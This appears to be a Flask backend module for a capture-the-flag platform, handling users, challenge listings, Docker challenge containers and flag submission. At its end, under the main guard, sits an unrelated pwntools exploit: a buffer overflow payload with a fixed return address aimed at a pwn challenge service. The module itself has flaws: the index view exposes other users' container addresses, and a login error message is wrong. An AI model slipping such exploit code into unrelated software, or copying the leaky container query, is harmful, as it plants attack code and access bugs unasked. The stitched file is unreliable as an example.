import json
import random
import string
from datetime import datetime, timedelta

import docker
from docker import errors as docker_error
from flask import Blueprint, render_template, request, make_response, g, redirect, send_from_directory
from sqlalchemy import func, desc
from werkzeug.security import check_password_hash, generate_password_hash

from app import db, scheduler
from app.api.frontend.services import FrontendService, RankService
from app.auth.acls import auth_cookie
from app.lib.decorators import check_user_permission
from app.lib.rest_response import fail, success
from app.lib.tools import get_ip
from app.lib.utils.authlib import create_token
from app.models.admin import Notice
from app.models.ctf import ImageResource, ContainerResource, Answer, Question
from app.models.user import User
from app.tasks.ctf import finish_container
import logging

bp = Blueprint("view", __name__, url_prefix='/api')

logger = logging.getLogger('app')


@bp.route('/upload/<path:filename>')
def send_upload_file(filename):
    name = request.args.get("filename")
    cache_timeout = None
    manager_folder = 'upload'
    return send_from_directory(manager_folder, filename, cache_timeout=cache_timeout,
                               attachment_filename=name or filename,
                               as_attachment=True)


def generate_flag():
    """
        生成flag
        return generate flag
    """
    rd_str = ''.join(random.sample(string.ascii_letters + string.digits, 32))
    return "flag{ocean%s}" % rd_str


@bp.route('/', methods=['get'])
@auth_cookie
def index():
    """
        :return :首页 后端渲染
    """
    subject = request.args.get('subject')
    subjects = ("Web", "Crypto", "Pwn", "Iot", "Misc")
    query = db.session.query(Question)
    if subject:
        query = query.filter(Question.type == subject.lower())
    solved_qid = []
    if g.user:
        # 我已解决的题目
        solved_question = db.session.query(Answer.question_id).filter(Answer.user_id == g.user.id,
                                                                      Answer.status == 1).all()
        solved_qid = [i[0] for i in solved_question]
    data = []
    links = {}
    if g.user:
        # 获取镜像资源
        containers = db.session.query(ContainerResource, ImageResource.question_id) \
            .join(ImageResource, ImageResource.id == ContainerResource.image_resource_id
                  ) \
            .join(User, User.id == ContainerResource.user_id).order_by(desc(ContainerResource.id)).all()
        # 获取用户容器
        for c in containers:
            container, question_id = c
            links[question_id] = ["%s:%s" % (container.addr, container.container_port)]
    # 统计每个题目解决人数

    solved_query = db.session.query(Answer.question_id, func.count(Answer.id)).filter(Answer.status == 1).group_by(
        Answer.question_id)
    solved_state = {}
    for qid, cnt in solved_query:
        solved_state[qid] = cnt
    for item in query:
        data.append({
            "active_flag": item.active_flag,
            "id": item.id,
            "links": links.get(item.id, []),
            "type": item.type,
            "desc": item.desc,
            "name": item.name,
            "score": item.score,
            "solved": solved_state.get(item.id, 0),
            "date_created": item.date_created.strftime("%y-%m-%d"),
            "has_solved": True if item.id in solved_qid else False
        })
    # 公告
    notices = []
    notice_query = db.session.query(Notice).all()
    for item in notice_query:
        notices.append({
            "id": item.id,
            "content": item.content,
            "date_create": item.date_created.strftime("%Y-%m-%d %H:%M")
        })
    response = make_response(render_template('index.html', user=g.user, challenges=data,
                                             subjects=subjects,
                                             subject=subject,
                                             notices=notices))
    if not g.user:
        response.delete_cookie('token')
    return response


@bp.route('/login', methods=['post'])
def login():
    """
    用户登录
    """
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")
    user = db.session.query(User).filter(User.username == username).one_or_none()
    if user and check_password_hash(user.password, password):
        token = create_token()
        user.token = token
        db.session.commit()
        return success({"token": token})
    else:
        return fail(msg="用户名或密码不允许为空")


@bp.route('/info', methods=['get'])
@check_user_permission
def info():
    """
        获取用户信息
    :return:
    """
    user = g.user
    data = {
        "username": user.username,
        "id": user.id

    }

    return success(data)


@bp.route('/register', methods=['get', 'post'])
def register():
    """
    用户注册
    """
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")
    if not all([username, password]):
        return fail(msg="用户名或密码不允许为空")
    user = db.session.query(User).filter(User.username == username).one_or_none()
    if user:
        return fail(msg="该用户名已注册")
    token = create_token()
    user = User(username=username, password=generate_password_hash(password), active=True, token=token)
    db.session.add(user)
    db.session.commit()

    return success()


@bp.route('/logout', methods=['post'])
@check_user_permission
def logout():
    """
    用户登出
    """
    user = g.user
    user.token = None
    db.session.commit()
    return success()


@bp.route('/rest_pass', methods=['post'])
@check_user_permission
def rest_pass():
    """
        修改密码
    :return:
    """
    user = g.user
    data = request.get_json()
    old_password = data.get("old_password")
    password = data.get("password")
    # 校验当前密码
    if not check_password_hash(user.password, old_password):
        return fail(msg="当前密码不匹配")
    # 校验密码规则
    user.password = generate_password_hash(password)
    # 推出登录
    # user.token = None
    db.session.commit()
    return success()


@bp.route('/challenge', methods=['get'])
def challenge_list():
    """
        题目列表
    :return:
    """
    user = g.user
    if user:
        solved = [i[0] for i in
                  db.session.query(Answer.question_id).filter(Answer.user_id == user.id,
                                                              Answer.status == Answer.status_ok)]
    else:
        solved = []
    # 每个题目的解题人数
    solved_query = db.session.query(Answer.question_id, func.count(Answer.id)).filter(
        Answer.status == Answer.status_ok).group_by(Answer.question_id).all()
    solved_cnt_dict = {i[0]: i[1] for i in solved_query}
    subjects = request.args.get("subject")
    query = db.session.query(Question).filter(Question.active == 1)
    if subjects:
        query = query.filter(Question.type == subjects)
    data = []
    for item in query:
        data.append({
            "id": item.id,
            "type": item.type,
            "name": item.name,
            "score": item.score,
            "desc": item.desc,
            "active_flag": item.active_flag,
            "solved_cnt": solved_cnt_dict.get(item.id, 0),
            "is_solved": bool(item.id in solved)
        })
    return success(data=data)


@bp.route('/challenge/<int:question>', methods=['get'])
@check_user_permission
def challenge_detail(question):
    """
        题目详情 包括已解决的用户情况  点赞情况
    :param question:
    :return:
    """
    instance = db.session.query(Question).get(question)
    if not instance:
        return fail(msg="题目不存在、请刷新页面！")
    answer_object = db.session.query(Answer).filter(Answer.user_id == g.user.id, Answer.status == Answer.status_ok,
                                                    Answer.question_id == question).first()
    container = db.session.query(ContainerResource).filter(ContainerResource.user_id == g.user.id,
                                                           ContainerResource.question_id == instance.id,
                                                           ContainerResource.destroy_time > datetime.now()).first()
    # 获取前三名
    ans = db.session.query(User.username).select_from(Answer).filter(Answer.question_id == question,
                                                                     Answer.status == Answer.status_ok,
                                                                     Answer.rank <= 3).join(User,
                                                                                            User.id == Answer.user_id)
    ans = [i[0] for i in ans]
    ans = list(ans) + [None] * (3 - len(list(ans)))
    first_blood, second_blood, third_blood = ans

    if container:
        container_data = {
            "create_time": container.date_created.strftime("%Y-%m-%d %H:%M:%S"),
            "url": "http://{}:{}".format(container.addr, container.container_port),
            "destroy_time": container.destroy_time.strftime("%Y-%m-%d %H:%M:%S"),
            "seconds": (container.destroy_time - container.date_created).total_seconds()
        }
    else:
        container_data = None

    get_score = answer_object.score if answer_object else None
    att = json.loads(instance.attachment) if instance.attachment else []
    data = {
        "first_blood": first_blood,
        "second_blood": second_blood,
        "third_blood": third_blood,
        "container": container_data,
        "get_score": get_score,
        "score": instance.score,
        "id": instance.id,
        "name": instance.name,
        "attachment": [{"name": i["name"], "url": "/api/upload/{}?filename={}".format(i["filename"], i["name"])} for i
                       in att],
        "desc": instance.desc,
        "active_flag": instance.active_flag,
        "type": instance.type,
        "solved": db.session.query(Answer).filter(Answer.question_id == instance.id,
                                                  Answer.status == Answer.status_ok).count(),
        "date_created": instance.date_created.strftime("%y-%m-%d")
    }
    return success(data)


@bp.route('/challenge/<int:question>/start', methods=['POST'])
@check_user_permission
def question_start(question):
    """
        创建一个题目容器
    :param question:
    :return:
    """
    user = g.user
    instance = db.session.query(Question).get(question)
    if not instance.active_flag:
        return fail(msg="静态题库无需动态生成")
    image_resource = instance.image
    if not image_resource:
        return fail(msg="服务器没有资源")
    connect_url = image_resource.host.docker_api
    client = docker.DockerClient(connect_url)
    try:
        image = client.images.get('{}:{}'.format(image_resource.name, image_resource.version))
    except docker.errors.ImageNotFound:
        return fail(msg="当前题目环境缺失、请联系管理员！")
    # 解析镜像端口
    image_config = image.attrs["ContainerConfig"]
    random_port = ""
    if "ExposedPorts" in image_config:
        port_dict = image.attrs["ContainerConfig"]["ExposedPorts"]
        for docker_port, host_port in port_dict.items():
            # docker_port_int = docker_port.replace("/", "").replace("tcp", "").replace("udp", "")
            random_port = str(random.randint(20000, 65535))
            port_dict[docker_port] = random_port
    else:
        port_dict = {}
    image_name = image.attrs["RepoTags"][0].replace(":", ".")
    container_name = f"{image_name}_{user.id}"
    # 检查docker 是否已存在
    try:
        c = client.containers.get(container_name)
        c.stop()
        c.remove()
    except docker.errors.NotFound:
        pass
    try:
        docker_container_response = client.containers.run(image=image.id, name=container_name, ports=port_dict,
                                                          detach=True)
    except docker.errors.APIError as e:
        logger.exception(e)
        return fail(msg="题目启动失败")
    # 获取创建的容器
    docker_container = client.containers.get(container_name)
    flag = generate_flag()
    command = "/start.sh '{}'".format(flag)
    docker_container.exec_run(cmd=command, detach=True)
    # 创建容器记录
    container = ContainerResource(image_resource_id=image_resource.id, flag=flag, question_id=question)
    container.addr = image_resource.host.ip
    container.container_id = docker_container_response.attrs["Id"]
    container.image_id = image.attrs["Id"]
    container.container_name = container_name
    container.container_status = docker_container_response.attrs["State"]["Status"]
    container.container_port = random_port
    container.user_id = user.id
    # 销毁时间
    container.destroy_time = datetime.now() + timedelta(minutes=10)
    # 创建容器
    db.session.add(container)
    db.session.commit()
    # 创建定时任务  到时间后销毁
    scheduler.add_job("finish_container_{}".format(container.id), finish_container,trigger='date', args=(container.id,),
                      next_run_time=datetime.now() + timedelta(minutes=10))
    return success({})


@bp.route('/challenge/<int:question>/delayed', methods=['POST'])
@check_user_permission
def question_delayed(question):
    """
        延长容器时间
    :param question:
    :return:
    """
    container = db.session.query(ContainerResource).filter(ContainerResource.user_id == g.user.id,
                                                           ContainerResource.question_id == question).order_by(
        desc(ContainerResource.id)).first()
    if not container:
        return fail("当前状态无法延长题目时间")
    # 最多延长三小时
    if (container.destroy_time - timedelta(hours=3)) > datetime.now():
        return fail("时间已达上限")
    container.destroy_time = container.destroy_time + timedelta(minutes=10)
    db.session.commit()

    return success()


@bp.route('/challenge/<int:question>/destroy', methods=['POST'])
@check_user_permission
def question_destroy(question):
    """
        销毁容器
    :param question:
    :return:
    """
    instance = db.session.query(Question).get(question)
    if not instance.active_flag:
        return fail("静态题库无需动态生成")
    containers = db.session.query(ContainerResource, ImageResource).join(ImageResource,
                                                                         ImageResource.id == ContainerResource.image_resource_id). \
        filter(ImageResource.id == instance.image_id, ContainerResource.user_id == g.user.id)
    for (container, image_resource) in containers:
        try:
            client = docker.DockerClient(image_resource.host.docker_api, timeout=3)
            docker_container = client.containers.get(container.container_id)
            docker_container.kill()
            docker_container.remove()
        except docker_error.DockerException:
            pass
        db.session.delete(container)
    db.session.commit()
    return success()


@bp.route('/user', methods=['post'])
@check_user_permission
def user_center():
    """
        修改用户信息
    """
    data = request.get_json()
    username = data.get("username")
    user = g.user
    # 检测用户名是否被占用
    if db.session.query(User).filter(User.username == username, User.id != user.id).first():
        return fail("用户名已被占用")
    user.username = username
    db.session.commit()
    return success()


@bp.route('challenge/submit', methods=["post"])
@check_user_permission
def challenge_submit():
    ip = get_ip()
    data = request.get_json()
    question_id = data.get("id")
    flag = data.get("flag")
    code, msg = FrontendService.submit(question_id, flag, g.user, ip=ip)
    if code:
        return fail(code, msg)
    else:
        return success(msg=msg)


@bp.route('notice', methods=['get'])
def notice():
    """
        公告列表
    """
    # 公告
    notices = []
    query = db.session.query(Notice)
    query = query.filter(Notice.active == 1)
    notice_query = query.order_by(desc(Notice.is_top), desc(Notice.id)).all()
    for item in notice_query:
        notices.append({
            "id": item.id,
            "is_top": item.is_top,
            "content": item.content,
            "create_time": item.date_created.strftime("%Y-%m-%d %H:%M")
        })
    return success(data=notices)


@bp.route('rank/score', methods=['get'])
def score_rank():
    """
        积分排行
    """
    # 公告
    code, data = RankService.score_rank(**request.args)
    return success(data=data)


if __name__ == "__main__":
    from pwn import *

    context.log_level = 'debug'

    # p = process('./f4n_pwn')
    p = remote('127.0.0.1', 9999)

    p.recvuntil('length : ')
    p.sendline('-1')
    payload = 'a' * 0x57 + p32(0x080486BB)
    p.recvuntil('name : \n')
    p.sendline(payload)

    p.interactive()
